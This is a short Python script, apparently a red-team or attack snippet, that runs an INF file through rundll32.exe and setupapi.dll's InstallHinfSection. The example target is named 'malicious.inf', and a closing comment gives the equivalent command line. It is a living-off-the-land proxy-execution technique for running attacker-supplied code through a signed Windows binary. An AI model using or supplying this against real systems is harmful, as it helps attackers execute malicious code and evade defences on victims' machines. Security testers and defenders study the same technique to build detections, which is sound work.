import subprocess
import os

def run_inf_with_rundll32(inf_path):
    if not os.path.exists(inf_path):
        print(f"[!] INF file not found: {inf_path}")
        return

    cmd = [
        "rundll32.exe",
        "setupapi.dll,InstallHinfSection",
        "DefaultInstall",
        "132",
        inf_path
    ]

    try:
        print(f"[+] Executing: {' '.join(cmd)}")
        subprocess.run(cmd, shell=True)
    except Exception as e:
        print(f"[!] Error executing INF: {e}")

# Example usage
run_inf_with_rundll32("C:\\Users\\Public\\malicious.inf")


# commandline to run basically the same thing as above
# rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 132 C:\path\to\malicious.inf

